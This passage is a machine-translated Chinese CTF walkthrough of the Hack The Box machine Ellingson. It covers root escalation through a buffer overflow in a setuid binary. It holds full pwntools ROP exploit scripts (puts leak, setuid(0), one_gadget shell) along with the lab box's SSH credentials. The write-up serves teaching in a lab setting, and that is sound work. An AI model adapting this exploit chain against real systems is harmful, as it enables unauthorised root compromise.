mp">root@kali:~/Documents/htb/boxes/ellingson/rop# file garbage<br/>garbage: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=de1fde9d14eea8a6dfd050fffe52bba92a339959, not stripped</span></pre><p id="4529" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">是64位精灵。</p><p id="e7ff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我尝试运行二进制文件并输入一些字符:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pb"><img src="../Images/e398f60ac6c6a6938aaa5dfee227de13.png" data-original-src="https://miro.medium.com/v2/resize:fit:1150/format:webp/1*iYNt0Kxte70KiLSk01J7gg.png"/></div></figure><p id="0f82" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后我试着抛出许多A，看看是否能触发分段错误，我得到了一个。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi pc"><img src="../Images/c3ee1935b7c37cfa430d5398a4d01883.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nzjH_dOvLn1F5YmKB74-hg.png"/></div></div></figure><p id="577c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">分段错误基本上意味着我们已经覆盖了RBP和返回指针。请注意，返回指针存储在堆栈中，以便在执行后将控制返回给指令指针。因为我们已经用内存地址0x41414141覆盖了它，所以它是无效的。看到我得到了一个分段错误，然后我将二进制文件加载到gdb以进一步检查:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pd"><img src="../Images/b830bb420da04f366b2847a6457ff983.png" data-original-src="https://miro.medium.com/v2/resize:fit:1314/format:webp/1*qFjY87i-liRUan6zGR_ykw.png"/></div></figure><p id="9b70" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我使用的是<a class="ae kt" href="https://github.com/longld/peda" rel="noopener ugc nofollow" target="_blank"> PEDA </a>，在进行二进制开发时非常方便。checksec命令检查二进制文件的安全选项。</p><p id="9c28" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="nj"> Stack Canary基本上是在缓冲区和返回指针之后的堆栈上注入一个4字节的值，如果该值被覆盖，就终止程序。</em></p><p id="8154" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="nj"> RELRO对ELF段重新排序，并使GOT(全局偏移表)为只读。</em></p><p id="2270" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="nj"> PIE(位置独立的可执行文件)在我们运行程序时随机化内存映射的位置(基本上这是ASLR)。</em></p><p id="efd3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">稍后我会点击NX。我可以通过在libc.so.6上运行ldd来验证在机器上启用了ASLR，我认为这是glibc库的一个符号链接:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pe"><img src="../Images/9da595fbc53bc6640652a66dd9086cb3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1222/format:webp/1*DeBeBGpkK-9iDM_OdhiVuA.png"/></div></figure><p id="b886" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看到NX被启用，这基本上是DEP(数据执行保护)，我不能简单地在堆栈上执行命令。</p><h1 id="90bd" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated">面向返回的程序设计</h1><p id="223d" class="pw-post-body-paragraph jn jo iq jp b jq ls js jt ju lt jw jx jy lu ka kb kc lv ke kf kg lw ki kj kk ij bi translated">这种攻击基于ret2libc攻击，用于绕过DEP(数据执行保护),后者阻止您在内存中运行命令，使代码更难运行。这种攻击有能力击败ASLR，不需要你注入代码。我将基本上利用指令序列(称为小工具)并创建某种“外壳代码”。</p><h2 id="6222" class="ml kv iq bd kw mx my dn la mz na dp le jy nb nc li kc nd ne lm kg nf ng lq nh bi translated">小玩意儿</h2><p id="4547" class="pw-post-body-paragraph jn jo iq jp b jq ls js jt ju lt jw jx jy lu ka kb kc lv ke kf kg lw ki kj kk ij bi translated">小工具是执行所需操作的指令序列(通常以return结尾),一起使用以实现目标。</p><p id="1f0c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">回到二进制文件，我将它加载到gdb，并使用pattern_create创建一个300个字符的模式:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi pf"><img src="../Images/f0dacfe4c141b12a4044a1add1fc2925.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kxns4FSvCTPVmuJ05gw_sA.png"/></div></div></figure><p id="cc08" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我得到一个分段错误。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi pg"><img src="../Images/720c0048a8719fe114bdf31155fdd7ba.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VwTioA1WVZ2f58d81EPOlg.png"/></div></div></figure><p id="47e2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请注意，在64位二进制文件中，您不会直接被IP覆盖。对于32位二进制，寄存器是EAX、EBX等。在64位二进制文件中，它们以r开头。</p><h2 id="1065" class="ml kv iq bd kw mx my dn la mz na dp le jy nb nc li kc nd ne lm kg nf ng lq nh bi translated">exploit.py(第1/3部分)</h2><p id="436e" class="pw-post-body-paragraph jn jo iq jp b jq ls js jt ju lt jw jx jy lu ka kb kc lv ke kf kg lw ki kj kk ij bi translated">为了识别溢出发生的位置，我将在gdb内部调用这个函数，并对pattern_offset运行结果:</p><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="f74e" class="ml kv iq mh b gy mm mn l mo mp">x/xg $rsp</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi ph"><img src="../Images/d07d025518540b8f9f8646f1dde2f7b6.png" data-original-src="https://miro.medium.com/v2/resize:fit:998/format:webp/1*rwzTNaQp5m6stcn4ni1o3A.png"/></div></figure><p id="9ffb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看到136后开始溢出。接下来，我需要获取PLT(过程链接表)、GOT(全局偏移量表)的地址，并使二进制泄漏成为一个地址:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi pi"><img src="../Images/6ccf2cc0d64b55cf37489db48fc969cf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ob27AszA0hxDBSlPiOAtOA.png"/></div></div></figure><p id="2183" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">获取PLT地址(调用存在于二进制文件中):</p><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="f2cb" class="ml kv iq mh b gy mm mn l mo mp">plt_put = 0x401050</span></pre><p id="b0d6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">获取GOT地址:</p><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="abfa" class="ml kv iq mh b gy mm mn l mo mp">got_put = 0x404028</span></pre><p id="8993" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我还使用<a class="ae kt" href="https://github.com/JonathanSalwan/ROPgadget" rel="noopener ugc nofollow" target="_blank"> ROPgadget </a>来获取我们的小工具的地址位置:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi pj"><img src="../Images/12691eb621eb96a36046dd5d8dec773c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PXmJU7dfYOajOUTnScGjTw.png"/></div></div></figure><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="e50b" class="ml kv iq mh b gy mm mn l mo mp">pop_rdi = 0x40179b</span></pre><p id="8267" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以脚本看起来是这样的:</p><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="375f" class="ml kv iq mh b gy mm mn l mo mp">from pwn import *</span><span id="d9ca" class="ml kv iq mh b gy mq mn l mo mp">#context(terminal=['tmux', 'new-window'])<br/>p = process('./garbage')<br/>#p = gdb.debug('./garbage', 'b main')<br/>context(os="linux", arch="amd64")<br/>#context.log_level = 'DEBUG'</span><span id="e03a" class="ml kv iq mh b gy mq mn l mo mp">#Stage 1 - Memory Leak<br/>log.success("Starting first stage:")<br/>plt_put = p64(0x401050)<br/>got_put = p64(0x404028)<br/>pop_rdi = p64(0x40179b)<br/>junk = "A" *136</span><span id="ddfe" class="ml kv iq mh b gy mq mn l mo mp">payload = junk + pop_rdi + got_put + plt_put <br/>p.sendline(payload)</span><span id="4b83" class="ml kv iq mh b gy mq mn l mo mp">p.recvline()<br/>p.recvline()</span></pre><p id="2432" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请注意，我需要将地址放入64位格式，因此是p64。</p><p id="20ef" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当我运行脚本时:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi pk"><img src="../Images/17e9b2adf401e8743177d2081f1df681.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OBDxbYJwgt03aK6KqwdWrw.png"/></div></div></figure><p id="2955" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请注意，我能够泄漏地址，但输出不一致。然后，我对脚本进行了一些修改，以正确泄漏内存地址并添加一些日志记录:</p><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="6888" class="ml kv iq mh b gy mm mn l mo mp">leak_puts= p.recvline().strip().ljust(8,"\x00")<br/>log.success("Length of the leaked puts = " + str(len(leak_puts)))<br/>log.success("Leaked puts@LIBC " + str(leak_puts))</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi pl"><img src="../Images/e55dfc0d8d21f6a9b27a14f179238c05.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PwnCTp8Wac-Rja6CUbuLkQ.png"/></div></div></figure><p id="6b96" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的漏洞脚本现在看起来像这样</p><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="8d2b" class="ml kv iq mh b gy mm mn l mo mp">#Stage 1 - Memory Leak                                                                                                                                                    <br/>log.success("Starting first stage:")                                                                                                                                      <br/>plt_put = p64(0x401050)                                                                                                                                                   <br/>got_put = p64(0x404028)                                                                                                                                                   <br/>pop_rdi = p64(0x40179b)                                                                                                                                                   <br/>junk = "A" *136</span><span id="3db8" class="ml kv iq mh b gy mq mn l mo mp">payload = junk + pop_rdi + got_put + plt_put<br/>p.sendline(payload)</span><span id="59b0" class="ml kv iq mh b gy mq mn l mo mp">p.recvline()<br/>p.recvline()</span><span id="ac2b" class="ml kv iq mh b gy mq mn l mo mp">leak_puts= p.recvline().strip().ljust(8,"\x00")<br/>log.success("Length of the leaked puts = " + str(len(leak_puts)))<br/>log.success("Leaked puts@LIBC " + str(leak_puts))<br/>leak_puts = u64(leak_puts)</span></pre><p id="09e8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当我运行它时:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi pm"><img src="../Images/1c03f65c92ed50e20fd13627b8ff8a0b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XV3BqX0fgyjrQ5MpbP4cCQ.png"/></div></div></figure><p id="409a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我可以泄漏libc内部puts的地址，但是进程崩溃了。我现在需要调用main，这样我就不会使程序崩溃，使泄漏的地址变得无用，因为下次我执行程序时，它会有一个不同的地址。我得到了main的地址:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi pn"><img src="../Images/9a9ef31217ecd022980a3857f01146e1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DoOfpb-a2EtT7tpb62bEOQ.png"/></div></div></figure><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="54b1" class="ml kv iq mh b gy mm mn l mo mp">plt_main = 0x401619</span></pre><p id="7b56" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我将它添加到漏洞利用代码中，因此在泄漏地址后我调用main:</p><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="c6df" class="ml kv iq mh b gy mm mn l mo mp">from pwn import *</span><span id="5f47" class="ml kv iq mh b gy mq mn l mo mp">#context(terminal=['tmux', 'new-window'])<br/>p = process('./garbage')<br/>#p = gdb.debug('./garbage', 'b main')<br/>context(os="linux", arch="amd64")<br/>#context.log_level = 'DEBUG'</span><span id="34c7" class="ml kv iq mh b gy mq mn l mo mp">#Stage 1 - Memory Leak<br/>log.success("Starting first stage:")<br/>plt_main = p64(0x401619)<br/>plt_put = p64(0x401050)<br/>got_put = p64(0x404028)<br/>pop_rdi = p64(0x40179b)<br/>junk = "A" *136</span><span id="3aaa" class="ml kv iq mh b gy mq mn l mo mp">payload = junk + pop_rdi + got_put + plt_put + plt_main<br/>p.sendline(payload)</span><span id="b4df" class="ml kv iq mh b gy mq mn l mo mp">p.recvline()<br/>p.recvline()</span><span id="2f77" class="ml kv iq mh b gy mq mn l mo mp">leak_puts= p.recvline().strip().ljust(8,"\x00")<br/>#log.success("Length of the leaked puts = " + str(len(leak_puts)))<br/>log.success("Leaked puts@LIBC " + str(leak_puts))<br/>leak_puts = u64(leak_puts)</span></pre><p id="3502" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当我运行这个脚本时，我可以再次启动二进制文件:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi po"><img src="../Images/f97fd3ccacaa93ae7ffc10e177a5dd99.png" data-original-src="https://miro.medium.com/v2/resize:fit:1306/format:webp/1*_w5bNKGTPfEjnyHwvuQGJA.png"/></div></figure><h2 id="27de" class="ml kv iq bd kw mx my dn la mz na dp le jy nb nc li kc nd ne lm kg nf ng lq nh bi translated">exploit.py(第二部分)</h2><p id="7125" class="pw-post-body-paragraph jn jo iq jp b jq ls js jt ju lt jw jx jy lu ka kb kc lv ke kf kg lw ki kj kk ij bi translated">我需要知道的是Ellingson box的libc.so.6中的内存地址，以计算偏移量。我将它复制到我的本地机器上:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi pp"><img src="../Images/ced76bad56b0ca3a14a05296076e7a05.png" data-original-src="https://miro.medium.com/v2/resize:fit:968/format:webp/1*kU0gvf263BoO2EPx7Pmzzg.png"/></div></figure><p id="c0df" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后我检查看跌期权的地址:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi pq"><img src="../Images/49626e5e819911c2e36ab943b36cae5c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2F1w6oEdOErOyJXrYqZEnA.png"/></div></div></figure><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="6d86" class="ml kv iq mh b gy mm mn l mo mp">libc_put = 0x809c0</span></pre><p id="5d27" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我还需要计算偏移量:</p><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="515e" class="ml kv iq mh b gy mm mn l mo mp">offset = (leak_puts - libc_put)</span></pre><p id="9108" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因为我需要提升特权，并且二进制文件设置了setuid位，所以我需要调用setuid:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi pr"><img src="../Images/ec6bee495979b4c3b7e3ec5b31601079.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uCSSeAebpIi5GClnxXNM0A.png"/></div></div></figure><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="b26d" class="ml kv iq mh b gy mm mn l mo mp">setuid = p64(offset + libc_setuid)</span></pre><p id="4252" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以阶段2看起来像这样，我首先设置setuid:</p><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="c02e" class="ml kv iq mh b gy mm mn l mo mp">#Stage 2<br/>pop_rdi = p64(0x40179b)<br/>libc_put = 0x0809c0<br/>libc_sys = 0x04f440<br/>libc_sh =  0x1b3e9a<br/>libc_setuid = 0x0e5970</span><span id="aeac" class="ml kv iq mh b gy mq mn l mo mp">offset = leak_puts - libc_put<br/>sys = p64(offset + libc_sys)<br/>sh = p64(offset + libc_sh)<br/>setuid = p64(offset + libc_setuid)</span><span id="d81b" class="ml kv iq mh b gy mq mn l mo mp">payload = junk + pop_rdi + p64(0x0) + setuid + plt_main<br/>p.sendline(payload)</span></pre><h2 id="f62b" class="ml kv iq bd kw mx my dn la mz na dp le jy nb nc li kc nd ne lm kg nf ng lq nh bi translated">exploit.py(第3部分)</h2><p id="ba5b" class="pw-post-body-paragraph jn jo iq jp b jq ls js jt ju lt jw jx jy lu ka kb kc lv ke kf kg lw ki kj kk ij bi translated">我现在添加可以获得shell的部分，因为我已经调用了setuid部分。我使用工具one <a class="ae kt" href="https://github.com/david942j/one_gadget" rel="noopener ugc nofollow" target="_blank"> one_gadget </a>找到/bin/sh的地址。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi ps"><img src="../Images/ee751bc69d21ebde6065dc60d0000b2f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ev4tCU9fbmqFwfxTouY9Tw.png"/></div></div></figure><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="9875" class="ml kv iq mh b gy mm mn l mo mp">#Stage 3<br/>log.success("Elevate privilege success")<br/>log.success("Check if you have a shell!")</span><span id="dc35" class="ml kv iq mh b gy mq mn l mo mp">payload = junk + one_gadget<br/>p.sendline(payload)<br/>p.interactive()</span></pre><p id="ae73" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当我运行漏洞时，我获得了root访问权限，现在可以读取root.txt:</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi pt"><img src="../Images/65ebe1fef253d250ea2894963e2061a6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hN0KDzdnIXVBKG84pDbUFQ.png"/></div></div></figure><p id="07e3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正在读取root.txt:</p><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="84ac" class="ml kv iq mh b gy mm mn l mo mp"># $ cat root.txt<br/><strong class="mh ir">1cc73a448021ea...</strong></span></pre><p id="8321" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最终漏洞代码:</p><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="1bd5" class="ml kv iq mh b gy mm mn l mo mp">from pwn import *</span><span id="6e4a" class="ml kv iq mh b gy mq mn l mo mp">host = "10.10.10.139"<br/>user="margo"<br/>password="iamgod$08"</span><span id="eeaa" class="ml kv iq mh b gy mq mn l mo mp">s=ssh(user=user,host=host,password=password)</span><span id="df69" class="ml kv iq mh b gy mq mn l mo mp">#context(terminal=['tmux', 'new-window'])<br/>p = s.process('/usr/bin/garbage')<br/>#p = gdb.debug('./garbage', 'b main')<br/>context(os="linux", arch="amd64")<br/>#context.log_level = 'DEBUG'</span><span id="f3c5" class="ml kv iq mh b gy mq mn l mo mp">#Stage 1 - Memory Leak<br/>log.success("Running 1st stage:")<br/>plt_main = p64(0x401619)<br/>plt_put = p64(0x401050)<br/>got_put = p64(0x404028)<br/>pop_rdi = p64(0x40179b)<br/>junk = "A" *136</span><span id="7803" class="ml kv iq mh b gy mq mn l mo mp">payload = junk + pop_rdi + got_put + plt_put + plt_main<br/>p.sendline(payload)</span><span id="1ac1" class="ml kv iq mh b gy mq mn l mo mp">p.recvline()<br/>p.recvline()</span><span id="7174" class="ml kv iq mh b gy mq mn l mo mp">leak_puts= p.recvline().strip().ljust(8,"\x00")<br/>log.success("Length of the leaked puts = " + str(len(leak_puts)))<br/>log.success("Leaked puts@LIBC " + str(leak_puts))<br/>leak_puts = u64(leak_puts)</span><span id="259f" class="ml kv iq mh b gy mq mn l mo mp">#Stage 2<br/>pop_rdi = p64(0x40179b)<br/>libc_put = 0x0809c0<br/>libc_sys = 0x04f440<br/>libc_sh =  0x1b3e9a<br/>libc_setuid = 0x0e5970</span><span id="2f17" class="ml kv iq mh b gy mq mn l mo mp">offset = leak_puts - libc_put<br/>sys = p64(offset + libc_sys)<br/>sh = p64(offset + libc_sh)<br/>setuid = p64(offset + libc_setuid)<br/>one_gadget = p64(offset + 0x4f2c5) <br/>payload = junk + pop_rdi + p64(0x0) + setuid + plt_main<br/>p.sendline(payload)</span><span id="9b3f" class="ml kv iq mh b gy mq mn l mo mp">#Stage 3<br/>log.success("Elevate privilege success")<br/>log.success("Check if you have a shell!")</span><span id="73ce" class="ml kv iq mh b gy mq mn l mo mp">payload = junk + one_gadget<br/>p.sendline(payload)<br/>p.interactive()</span></pre><p id="e898" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我还检查了每个用户的主目录下的有趣文件，但除了/home/theplague下的这个，基本上是计算机安全官就Margo的密码训斥Hal:</p><pre class="km kn ko kp gt mg mh mi mj aw mk bi"><span id="e735" class="ml kv iq mh b gy mm mn l mo mp"># $ cat mbox<br/>From theplague@ellingson  Sun Feb 10 18:28:29 2019<br/>Return-Path: &lt;theplague@ellingson&gt;<br/>X-Original-To: hal@localhost<br/>Delivered-To: hal@localhost<br/>Received: by ellingson.localdomain (Postfix, from userid 1000)<br/>        id 913D4E094C; Sun, 10 Feb 2019 18:28:29 +0000 (UTC)<br/>Subject: Get Your Users Under Control!<br/>To: &lt;hal@localhost&gt;<br/>X-Mailer: mail (GNU Mailutils 3.4)<br/>Message-Id: &lt;20190210182829.913D4E094C@ellingson.localdomain&gt;<br/>Date: Sun, 10 Feb 2019 18:28:29 +0000 (UTC)<br/>From: Eugene Belford &lt;theplague@ellingson&gt;</span><span id="516f" class="ml kv iq mh b gy mq mn l mo mp">Hal,<br/>You hapless technoweenie, next time you see Margo tell her to change her password! Tell her to stop using varients of 'god' in here password!!! So no god, g0d, aG0D...she doesn't seem to get it despite the countless memos.</span></pre><p id="e444" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这就是我如何在黑盒子里做盒子Ellingson。我希望你能从这次演练中学到一些东西。干杯！🍺</p></div><div class="ab cl pu pv hu pw" role="separator"><span class="px bw bk py pz qa"/><span class="px bw bk py pz qa"/><span class="px bw bk py pz"/></div><div class="ij ik il im in"><p id="e2a0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="nj">关注</em> <a class="ae kt" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="nj"> Infosec报道</em> </a> <em class="nj">获取更多此类精彩报道。</em></p><div class="oh oi gp gr oj ok"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="ol ab fo"><div class="om ab on cl cj oo"><h2 class="bd ir gy z fp op fr fs oq fu fw ip bi translated">信息安全报道</h2><div class="or l"><h3 class="bd b gy z fp op fr fs oq fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="os l"><p class="bd b dl z fp op fr fs oq fu fw dk translated">medium.com</p></div></div><div class="qb l"><div class="qc l qd qe qf qb qg kr ok"/></div></div></a></div></div></div>    
</body>
</html>